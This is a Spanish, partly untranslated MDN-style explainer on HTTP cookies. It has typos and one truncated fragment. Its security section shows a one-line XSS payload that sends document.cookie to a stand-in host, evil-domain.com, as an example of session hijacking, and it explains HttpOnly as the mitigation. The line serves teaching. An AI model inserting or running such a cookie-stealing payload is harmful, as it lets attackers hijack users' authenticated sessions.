# HTTP Cookies

Una HTTP Cookie es una pequeña pieza de datos que un servidor enví al usuario del navigador, que puede guardarlo y enviarrlo de vuelta junto con la siguiente petición del mismo servidor


Las cookies son usadas principalmente para:

* Gestionar las sesiones
* Personalización (preferencias de usuario)
* Analizar el comportamiento del usuario




## Creating cookiesEDIT

Cuando recibe una solicitud HTTP, un servidor puede enviar un encabezamiento Set-Cookie con la respuesta. La Cookie es almacenada por el navegador y luego se envía el valor con todas las respuestas hechas por el mismo servidor. 

### The Set-Cookie and Cookie headers
El encabezamiento de respuesta HTTP Set-Cookie es utilizado para enviar cookies desde el servidor hasta el usuario. Una cookie simple puede ser así:
                                                     
_Set-Cookie: <cookie-name>=<cookie-value>_

El servidor le cuenta al cliente para guardar una cookie. La respuesta enviada al navegador puede contener el encabezamiento Set-Cookie y el navegador guardará la cookie.

HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry

[page content]

Ahora con todas las nuevas peticiones al servidor, el navegador enviará de buelto todas las cookies almacenadas anteriormente.

GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry

### Session cookies

La cookie simple creada anteriormente es una cookie de sesión: Se removerá cuando el cliente se desconecte, duran solo lo que dura la sesión. Tenga en cuenta, sin embargo, que los navegadores web a menudo tienen permitido la restauración de la sesión, lo que hará que la mayoría de las cookies de sesión permanezcan en realidad como si el navegador no se cerró.

### Permanent cookies

En vez de expirar cuando se termina la cesión del cliente, estas cookies lo hacen en una determinada fecha o después de un periodo de tiempo específico (Expires) o (Max-Age)

Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;

### Secure and HttpOnly cookies

Una cookie segura solo se enviará al servidor cuando la petición está hecha usando SSL y HHTPS. Sin embargo, tenga en cuenta que la información confidencial o sensible no debe ser almacenada o transmitida en cookies HTTP como todo el mecanismo es inherentemente inseguro y esta flag no ofrecerá ningún tipo de cifrado o seguridad adicional

Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly

### JavaScript access using Document.cookies
Las nuevas cookies también pueden ser creadas por Document.cookie y también existen cookies que pueden ser accedidas desde Javascript

document.cookie = "yummy_cookie=choco"; 
document.cookie = "tasty_cookie=strawberry"; 
console.log(document.cookie); 
// logs "yummy_cookie=choco; tasty_cookie=strawberry"

## Security

### Session hijacking and XSS

Las cookies se utilizan a menudo en aplicaciones web para identificar a un usuario y su sesión autenticada. Así que el robo de una cookie de una aplicación web puede dar lugar a secuestrar la sesión del usuario autenticado. Una de las maneras más comunes de robar cookies incluye el uso de Social Engineering o utilizando un XSS vulnerability en la aplicación

(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
The HttpOnly cookie attribute can help to mitigate this attack by preventing access to cookie value through JavaScript.

### Tracking and privacy
## Third-party cookies
Las cooki
Las cookies tienen un dominio asociado a ellos. Si este dominio es el mismo que el dominio de la página en la que se encuentra, se dice que las cookies son una cookie de origen . Si el dominio es diferente, se dice que es una cookie de terceros. Mientras que las cookies de origen sólo se envían al servidor de configuración de ellas mismas, una página web puede contener imágenes u otros componentes almacenados en los servidores de otros dominios (como banners publicitarios). Las cookies que se envían a través de estos componentes de terceros se llaman cookies de terceros y se utilizan principalmente para la publicidad y el seguimiento a través de la web.

### Do-Not-Track

No existen requisitos legales o tecnológicas para su uso, pero la cabecera DNT se pueden utilizar para indicar que una aplicación web debe desactivar o bien su seguimiento o el seguimiento de los usuarios a través del sitio. 

### Zombie cookies and Evercookies

Un enfoque más radical a las cookies son las cookies zombi o "evercookies", que se recrean después de su eliminación y son intencionadamente difícil de eliminar para siempre. Están utilizando la API de almacenamiento Web , Flash Local Shared Objects y otras técnicas para recrear a sí mismos cada vez que se detecta la ausencia de la cookie.